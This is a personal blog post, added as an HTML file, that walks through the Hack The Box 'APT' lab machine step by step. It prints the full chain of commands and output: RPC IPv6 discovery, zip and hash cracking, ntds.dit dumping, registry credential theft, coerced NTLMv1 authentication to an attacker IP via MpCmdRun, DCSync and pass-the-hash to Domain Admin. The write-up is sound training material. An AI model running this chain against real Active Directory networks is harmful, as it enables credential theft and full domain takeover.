@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head> <title>Hack The Box (HTB) Labs: APT - Wencheng Xue</title> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <link rel="stylesheet" type="text/css" href="xuewe.css"> <link rel="stylesheet" type="text/css" href="content.css">  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> </head>
+
+<body>
+<div class="topmenu">
+<a class="topmenu" href="index.html">about</a>
+<a class="topmenu" href="blog.html">blog</a>
+<a class="topmenu" href="contact.html">contact</a>
+<a class="topmenu" href="documentation.html">documentation</a>
+<a class="topmenu" href="experience.html">experience</a>
+</div>
+<div class="main">
+<style>
+.content {
+    padding-top: 22px;
+    padding-bottom: 160px;
+    max-width: 760px;
+    margin-left: auto;
+    margin-right: auto;
+    font-family: 'Times New Roman', Times, serif;
+}
+.article {
+    max-width: 760px;
+}
+.post-title {
+    font-family: Georgia, 'Times New Roman', serif;
+    font-weight: 700;
+    color: #ffffff;
+    font-size: 40px;
+    line-height: 1.08;
+    letter-spacing: -0.5px;
+    margin: 0 0 14px;
+}
+.article p {
+    font-size: 18px;
+    line-height: 1.4;
+    margin: 0 0 8px;
+    text-align: left;
+    color: #e4e4e4;
+}
+.article h2 {
+    font-family: Georgia, 'Times New Roman', serif;
+    font-weight: 700;
+    font-size: 23px;
+    color: #ffffff;
+    margin: 24px 0 7px;
+}
+.article h3 {
+    font-family: Georgia, 'Times New Roman', serif;
+    font-weight: 700;
+    font-size: 18px;
+    color: #e9b4b4;
+    margin: 18px 0 5px;
+}
+.article ol,
+.article ul {
+    margin: 6px 0 12px;
+    padding-left: 1.4em;
+}
+.article li {
+    font-size: 18px;
+    line-height: 1.4;
+    margin-bottom: 5px;
+    color: #e4e4e4;
+}
+.article b { color: #e9b4b4; }
+.article a:not(.backlink) {
+    color: #e9b4b4;
+    text-decoration: underline;
+    text-underline-offset: 2px;
+}
+.article a:not(.backlink):hover { color: #ffffff; }
+.article code {
+    font-family: Consolas, 'DejaVu Sans Mono', Menlo, Monaco, monospace;
+    font-size: 90%;
+    color: #d98a8a;
+    overflow-wrap: break-word;
+}
+.article pre {
+    background: #161616;
+    border: 1px solid #2d2d2d;
+    border-radius: 6px;
+    padding: 12px 15px;
+    overflow-x: auto;
+    margin: 7px 0 12px;
+    line-height: 1.1;
+}
+.article pre code {
+    font-family: Consolas, 'DejaVu Sans Mono', Menlo, Monaco, monospace;
+    font-size: 12.5px;
+    line-height: 1.1;
+    color: #dcdcdc;
+    white-space: pre;
+    display: block;
+}
+.code-wrap {
+    position: relative;
+}
+.copy-btn {
+    position: absolute;
+    top: 7px;
+    right: 7px;
+    padding: 4px 9px;
+    font-family: Arial, 'Helvetica Neue', 'Segoe UI', sans-serif;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    color: #cfcfcf;
+    background: #262626;
+    border: 1px solid #3d3d3d;
+    border-radius: 5px;
+    cursor: pointer;
+    opacity: 0.5;
+    transition: opacity 0.12s ease, background 0.12s ease, color 0.12s ease;
+}
+.code-wrap:hover .copy-btn { opacity: 1; }
+.copy-btn:hover { background: #b35a5a; color: #ffffff; border-color: #b35a5a; }
+.copy-btn.copied { background: #2e7d46; color: #ffffff; border-color: #2e7d46; opacity: 1; }
+.backlink {
+    display: inline-block;
+    margin-top: 36px;
+    padding: 10px 20px;
+    background: #b35a5a;
+    color: #ffffff;
+    font-family: Georgia, 'Times New Roman', serif;
+    font-weight: 700;
+    text-decoration: none;
+    font-size: 15px;
+    border-radius: 4px;
+}
+.backlink:hover { background: #c96d6d; color: #ffffff; }
+@media screen and (max-width: 600px) {
+    .post-title { font-size: 30px; }
+}
+</style>
+<div class="content">
+<div class="article">
+<div class="post-title">Hack The Box (HTB) Labs: APT</div>
+
+<h2>Overview</h2>
+<p>APT is an Insane-rated Windows machine built around an Active Directory domain controller. What makes it unusual is how little is exposed over IPv4. A full port scan returns only two open ports: HTTP and MSRPC. Neither gives away much, and the usual SMB, LDAP, and Kerberos services appear to be missing.</p>
+<p>The reason becomes clear once you look beyond IPv4. The machine is also reachable over IPv6, where the rest of the domain controller's services are exposed.</p>
+<p>My initial foothold came from an unauthenticated RPC call that revealed the machine's IPv6 addresses. From there, I found an SMB share containing a password-protected backup of the Active Directory database. Cracking the archive gave me access to the database and its supporting registry hives, which I used to extract domain hashes.</p>
+<p>That was only part of the way in. After identifying the few accounts that were still active, I found another set of credentials in the remote registry. Those credentials provided a low-privileged WinRM session. From there, I traced a change to the machine's NTLM compatibility settings, coerced an NTLMv1 authentication from the domain controller, and recovered the machine account's hash. Since that account had the rights needed for directory replication, I was able to DCSync the domain and obtain the Administrator hash.</p>
+
+<h2>Enumeration</h2>
+
+<h3>Nmap</h3>
+<p>I started with a full TCP port scan against <code>10.10.10.171</code>. I used <code>-p-</code> to cover all ports, <code>-sC</code> and <code>-sV</code> for default scripts and service detection, and <code>-oA</code> to save the results in all three output formats.</p>
+<pre><code>nmap -sCV -n -p- -Pn -oA apt 10.10.10.171
+
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Microsoft IIS httpd 10.0
+|_http-title: Gigantic Hosting | Home
+135/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre>
+<p>Only ports 80 and 135 were responding. That is a fairly unusual result for a Windows domain controller. There was no SMB, LDAP, or Kerberos exposed over the address I had been given.</p>
+<p>I checked the web server first, but it did not offer much.</p>
+
+<h3>Port 80 &ndash; HTTP</h3>
+<p>The website was a static marketing page for a hosting company. I found a contact address, sales@gigantichosting.com, and a comment left by HTTrack that revealed where the site had originally been mirrored from:</p>
+<pre><code>&lt;!-- Mirrored from 10.12.44.9/ by HTTrack Website Copier/3.x [XR&amp;CO'2014], Mon, 23 Dec 2019 08:12:54 GMT --&gt;</code></pre>
+<p>The <code>/support</code> form also redirected to that internal address. I could not reach or ping it, so there was little reason to spend more time on the web application.</p>
+<p>Port 135 was the more interesting lead.</p>
+
+<h3>Port 135 &ndash; RPC and IPv6 discovery</h3>
+<p>My first attempt was to connect to the RPC service directly over IPv4:</p>
+<pre><code>rpcclient -I 10.10.10.171 -U "" -N -p 135
+
+Cannot connect to server. Error was NT_STATUS_CONNECTION_DISCONNECTED</code></pre>
+<p>Rather than treating that as a dead end, I looked at what information the RPC interfaces might expose without authentication.</p>
+<p>One useful interface is the OXID resolver. Its <code>IObjectExporter::ServerAlive2</code> method can return the network bindings associated with a host. That includes interface addresses that may not be apparent from the address used to establish the RPC connection.</p>
+<p>I adapted a small Impacket script to call the method against the target:</p>
+<pre><code>from impacket.dcerpc.v5 import transport
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
+from impacket.dcerpc.v5.dcomrt import IObjectExporter
+
+target_ip = "10.10.10.171"
+stringBinding = r'ncacn_ip_tcp:%s' % target_ip
+
+rpctransport = transport.DCERPCTransportFactory(stringBinding)
+portmap = rpctransport.get_dce_rpc()
+portmap.set_auth_level(RPC_C_AUTHN_LEVEL_NONE)
+portmap.connect()
+
+bindings = IObjectExporter(portmap).ServerAlive2()
+print("[*] Interfaces on " + target_ip)
+for binding in bindings:
+    print("Address: " + binding['aNetworkAddr'])</code></pre>
+<p>The response included the hostname, the IPv4 address, and two IPv6 addresses:</p>
+<pre><code>[*] Interfaces on 10.10.10.171
+Address: apt
+Address: 10.10.10.171
+Address: dead:beef::2c9f:a471:e3b8:1d04
+Address: dead:beef::9f21:7c6a:5d13:884e</code></pre>
+<p>The <code>dead:beef::</code> prefix is familiar from HTB's IPv6-enabled machines, so I tested one of the addresses:</p>
+<pre><code>ping -c 2 -6 dead:beef::2c9f:a471:e3b8:1d04
+
+64 bytes from dead:beef::2c9f:a471:e3b8:1d04: icmp_seq=1 ttl=63 time=66.9 ms
+64 bytes from dead:beef::2c9f:a471:e3b8:1d04: icmp_seq=2 ttl=63 time=65.4 ms</code></pre>
+<p>The address was alive. More importantly, RPC was now accessible through it. Most of the LSA and SAM queries still returned ACCESS_DENIED, but <code>srvinfo</code> confirmed the hostname and Windows version:</p>
+<pre><code>rpcclient -I dead:beef::2c9f:a471:e3b8:1d04 -U "" -N
+
+rpcclient $&gt; srvinfo
+        APT.HTB        Wk Sv PDC Tim NT
+        platform_id     :       500
+        os version      :       10.0</code></pre>
+<p>At this point, I had a second address to investigate. I rescanned it rather than assuming the exposed services would be the same as IPv4.</p>
+
+<h3>Nmap over IPv6</h3>
+<p>The IPv6 scan revealed an entirely different attack surface:</p>
+<pre><code>PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos
+135/tcp   open  msrpc        Microsoft Windows RPC
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 (workgroup: HTB)
+636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (WinRM)
+9389/tcp  open  mc-nmf       .NET Message Framing</code></pre>
+<p>This was clearly the domain controller's real service surface. SMB, LDAP, Kerberos, and WinRM were all available over IPv6.</p>
+<p>I used enum4linux-ng to help with enumeration and worked out how to pass the IPv6 address to smbclient. An anonymous share listing revealed a share named <code>backup</code>:</p>
+<pre><code>smbclient -t 5 -W htb -U % -L //dead:beef::2c9f:a471:e3b8:1d04
+
+Sharename       Type      Comment
+---------       ----      -------
+backup          Disk
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share
+SYSVOL          Disk      Logon server share</code></pre>
+<p>The <code>backup</code> share was not a standard domain share, so I took a closer look. It contained a single archive:</p>
+<pre><code>smbclient -t 5 -W htb -U % //dead:beef::2c9f:a471:e3b8:1d04/backup
+
+smb: \&gt; dir
+  backup.zip                          A 10650961  Thu Sep 24 03:30:32 2020
+smb: \&gt; get backup.zip</code></pre>
+
+<h3>Extracting the Active Directory backup</h3>
+<p>After downloading the archive, I tried extracting it. The archive was password-protected, but its directory structure was still visible:</p>
+<pre><code>unzip backup.zip
+
+skipping: Active Directory/ntds.dit  incorrect password
+skipping: registry/SYSTEM            incorrect password</code></pre>
+<p>The important detail was that the filenames and directory entries were not encrypted. That meant I could use <code>zip2john</code> to extract the archive's password hash without first knowing the password.</p>
+<pre><code>zip2john backup.zip &gt; backup.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash</code></pre>
+<p>John recovered the password almost immediately:</p>
+<pre><code>iloveyousomuch   (backup.zip)
+1g 0:00:00:00 DONE</code></pre>
+<p>The extracted files included <code>ntds.dit</code>, <code>ntds.jfm</code>, and the SYSTEM and SECURITY registry hives. With those files available, I could extract the domain's password hashes offline.</p>
+<p>I used Impacket's <code>secretsdump.py</code>:</p>
+<pre><code>secretsdump.py -ntds 'Active Directory/ntds.dit' \
+    -system registry/SYSTEM \
+    -security registry/SECURITY LOCAL</code></pre>
+<p>The tool successfully decrypted the database:</p>
+<pre><code>[*] Target system bootKey: 0x936ce5da88593206567f650411e1d16b
+[*] Reading and decrypting hashes from Active Directory
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:72791983d95870c0d6dd999e4389b211:::
+APT$:1000:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb:::
+...snipped ~2000 accounts...</code></pre>
+<p>The dump contained roughly 2,000 accounts. Most were likely stale, and trying to use all of them would have been a waste of time. I needed to narrow the list down to accounts that still existed in the domain.</p>
+<p>I extracted the usernames and used Kerbrute to enumerate them:</p>
+<pre><code>kerbrute userenum --dc apt.htb.local -d htb users
+
+[+] VALID USERNAME: Administrator@htb
+[+] VALID USERNAME: APT$@htb
+[+] VALID USERNAME: henry.vinson@htb
+Done! Tested 2004 usernames (3 valid)</code></pre>
+<p>Only three accounts were still valid: Administrator, the machine account <code>APT$</code>, and <code>henry.vinson</code>. The human account was the most promising place to start.</p>
+
+<h3>Finding usable credentials</h3>
+<p>I extracted the NT hashes from the database and tested them against the valid usernames by requesting Kerberos TGTs. This let me determine which hash belonged to henry.vinson.</p>
+<p>One detail worth checking before doing this is clock synchronization. Kerberos is sensitive to time differences, and I initially needed to synchronize my clock with the domain controller to avoid <code>KRB_AP_ERR_SKEW</code>. Running <code>net time -S apt.htb.local</code> and adjusting the local clock resolved that.</p>
+<p>Once I had the correct hash, I tried using it for remote execution. That did not get me very far. psexec, wmiexec, smbexec, and dcomexec all returned access-denied errors, and none of the available shares were writable.</p>
+<p>The account did, however, have permission to read the remote registry. That gave me another place to look for credentials. I used Impacket's <code>reg.py</code> to enumerate it:</p>
+<pre><code>reg.py -dc-ip apt.htb.local \
+    -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb \
+    apt.htb.local query -keyName HKU -s</code></pre>
+<p>Among the results was a key belonging to a custom application:</p>
+<pre><code>\Software\GiganticHostingManagementSystem\
+        UserName        REG_SZ   henry.vinson_adm
+        PassWord        REG_SZ   G1#Ny5@2dvht</code></pre>
+<p>The application had stored another account's credentials directly in the registry, including the password in cleartext. This gave me a new set of credentials to test.</p>
+
+<h2>Initial foothold</h2>
+<p>The credentials worked over WinRM:</p>
+<pre><code>evil-winrm -u henry.vinson_adm -p 'G1#Ny5@2dvht' -i apt.htb.local</code></pre>
+<p>I checked the account's groups and privileges:</p>
+<pre><code>whoami /all
+
+User Name            SID
+===================  ===============================================
+htb\henry.vinson_adm S-1-5-21-2993095098-2100462451-206186470-1106
+
+Group Name                        Type
+================================= =====
+BUILTIN\Remote Management Users   Alias
+BUILTIN\Users                     Alias</code></pre>
+<p>This was a working shell, but the account was still fairly restricted. It had no particularly useful group memberships or privileges. The user flag was available on the desktop:</p>
+<pre><code>type user.txt
+
+7f2a9c41db0e5368a1c4ff7729bd0e14</code></pre>
+<p>With the initial foothold established, I moved on to local enumeration.</p>
+
+<h2>Path to Administrator</h2>
+
+<h3>Local enumeration</h3>
+<p>The executable versions of winPEAS would not run, and <code>systeminfo</code> was blocked. I switched to checking the filesystem and configuration manually. One of the first places I checked was <code>C:\Windows\Panther\unattend.xml</code>.</p>
+<p>Unattended installation files can contain credentials left behind during deployment. In this case, the Administrator password had been removed, but the file still contained an encoded PowerShell command:</p>
+<pre><code>&lt;AutoLogon&gt;
+   &lt;Username&gt;Administrator&lt;/Username&gt;
+   &lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt;
+&lt;/AutoLogon&gt;
+...
+&lt;CommandLine&gt;powershell -enc KABHAGUAdAAtAE4AZQB0AEEAZABhAHAAdAB0AG...&lt;/CommandLine&gt;</code></pre>
+<p>I decoded the PowerShell command to see what it did:</p>
+<pre><code>(Get-NetAdapter | Disable-NetAdapterBinding -ComponentID ms_tcpip6 -confirm:$false)</code></pre>
+<p>It disabled IPv6 on the network adapter. That was an interesting discovery given that IPv6 had been the way into the machine in the first place, but it did not directly provide a privilege escalation path.</p>
+<p>The PowerShell history was more useful. It showed that the administrator had previously changed a security setting:</p>
+<pre><code>$Cred = get-credential administrator
+invoke-command -credential $Cred -computername localhost -scriptblock {
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
+        lmcompatibilitylevel -Type DWORD -Value 2 -Force }</code></pre>
+<p>The setting was <code>LmCompatibilityLevel</code>, and it had been explicitly changed to <code>2</code>.</p>
+
+<h3>Coercing an NTLMv1 response</h3>
+<p><code>LmCompatibilityLevel</code> controls the authentication protocols Windows uses for outgoing NTLM responses. A value of <code>2</code> allows the machine to use NTLMv1.</p>
+<p>That matters because NTLMv1 relies on DES-based cryptography and can be attacked using precomputed rainbow tables. Rather than trying to crack the machine account's long, randomly generated password directly, I could try to make the domain controller authenticate to a machine I controlled, capture the response, and recover its underlying NT hash.</p>
+<p>I started Responder with the challenge format needed for the cracking process:</p>
+<pre><code>sudo responder -I tun0 --lm</code></pre>
+<p>The next problem was getting the machine to authenticate outward. The henry.vinson_adm account could not access the usual coercion surfaces, so I looked for functionality already available on the host.</p>
+<p>Windows Defender's <code>MpCmdRun.exe</code> can be used to scan a file or directory. Supplying a UNC path causes the machine to attempt an SMB connection to that location, and that connection was enough to trigger an authentication attempt using the machine account. The executable was available under the Defender platform directory:</p>
+<pre><code>./MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.36\test</code></pre>
+<p>The scan failed, but that was not important. The SMB connection had already been attempted, and Responder captured the authentication:</p>
+<pre><code>[SMB] NTLMv1 Client   : dead:beef::2c9f:a471:e3b8:1d04
+[SMB] NTLMv1 Username : HTB\APT$
+[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788</code></pre>
+<p>The captured identity was HTB\APT$, the domain controller's machine account.</p>
+<p>Since the password itself was not realistically guessable, I reformatted the captured response and submitted it to crack.sh, which uses DES rainbow tables for this type of NTLMv1 response. The recovered NT hash was:</p>
+<pre><code>NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
+
+Key: d167c3238864b12f5f82feae86a7f798</code></pre>
+<p>The process took roughly thirty seconds. I now had the machine account's NT hash.</p>
+
+<h3>From the machine account to Domain Administrator</h3>
+<p>The final step was using the recovered machine account credentials to perform directory replication.</p>
+<p>The <code>APT$</code> account had the required replication privileges, which meant I could use DCSync to retrieve the current domain hashes directly from the domain controller. This was preferable to relying on the old backup, which contained thousands of accounts and potentially outdated credentials.</p>
+<p>I used <code>secretsdump.py</code> with <code>-just-dc</code>:</p>
+<pre><code>secretsdump.py \
+    -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798 \
+    -just-dc HTB/APT\$@apt.htb.local</code></pre>
+<p>The DRSUAPI method returned the current hashes:</p>
+<pre><code>[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
+henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::</code></pre>
+<p>I now had the current Administrator NT hash. There was no need to crack it; I could authenticate with it directly using pass-the-hash.</p>
+<pre><code>evil-winrm -u Administrator \
+    -H c370bddf384a691d811ff3495e8a72e2 \
+    -i apt.htb.local</code></pre>
+<p>After connecting, I verified the account's privileges:</p>
+<pre><code>whoami /all
+
+htb\administrator
+
+HTB\Domain Admins
+HTB\Enterprise Admins
+HTB\Schema Admins</code></pre>
+<p>The account had membership in Domain Admins, Enterprise Admins, and Schema Admins. That confirmed full domain compromise. One small detail when using Evil-WinRM: the NT hash must be supplied with <code>-H</code>, not <code>-p</code>.</p>
+<p>The root flag was on the Administrator desktop:</p>
+<pre><code>type root.txt
+
+c81d4e6b55210aa903fb28c6e4d9b7a2</code></pre>
+
+<h2>Final thoughts</h2>
+<p>APT was difficult because the important details were spread across several parts of the machine. The initial IPv4 scan made the host look almost empty, but the RPC interface exposed the IPv6 addresses that led to the actual domain controller services. The backup share then provided an offline copy of Active Directory, while the remote registry revealed credentials that were not available anywhere obvious on the filesystem.</p>
+<p>The final escalation was a separate chain. A previous administrator had lowered the machine's NTLM compatibility setting, making it possible to capture and crack an NTLMv1 response. The recovered machine account hash was enough to perform DCSync and retrieve the Administrator credentials.</p>
+<p>None of these techniques is particularly obscure on its own. What makes APT interesting is having to recognize where each clue leads and how the pieces fit together. The IPv6 exposure, the poorly protected backup, the credentials stored in the registry, and the NTLMv1 configuration all contribute to the final compromise.</p>
+<p>The biggest takeaway for me was not to treat an unusually small scan result as proof that the attack surface is small. In this case, the services were there all along; I was simply looking at the wrong network stack.</p>
+
+<a class="backlink" href="documentation.html">&larr; Back to Documentation</a>
+</div>
+</div>
+</div>
+<script>
+(function () {
+    function fallbackCopy(text, cb) {
+        var ta = document.createElement('textarea');
+        ta.value = text; ta.setAttribute('readonly', '');
+        ta.style.position = 'fixed'; ta.style.top = '-1000px'; ta.style.opacity = '0';
+        document.body.appendChild(ta); ta.select();
+        try { document.execCommand('copy'); } catch (e) {}
+        document.body.removeChild(ta); cb();
+    }
+    var pres = document.querySelectorAll('.article pre');
+    for (var i = 0; i < pres.length; i++) {
+        (function (pre) {
+            var code = pre.querySelector('code');
+            if (!code) return;
+            var wrap = document.createElement('div');
+            wrap.className = 'code-wrap';
+            pre.parentNode.insertBefore(wrap, pre);
+            wrap.appendChild(pre);
+            var btn = document.createElement('button');
+            btn.type = 'button'; btn.className = 'copy-btn'; btn.textContent = 'Copy';
+            btn.addEventListener('click', function () {
+                var text = code.textContent;
+                function done() {
+                    btn.textContent = 'Copied'; btn.classList.add('copied');
+                    setTimeout(function () { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1400);
+                }
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(text).then(done, function () { fallbackCopy(text, done); });
+                } else { fallbackCopy(text, done); }
+            });
+            wrap.appendChild(btn);
+        })(pres[i]);
+    }
+})();
+</script>
+</body></html>
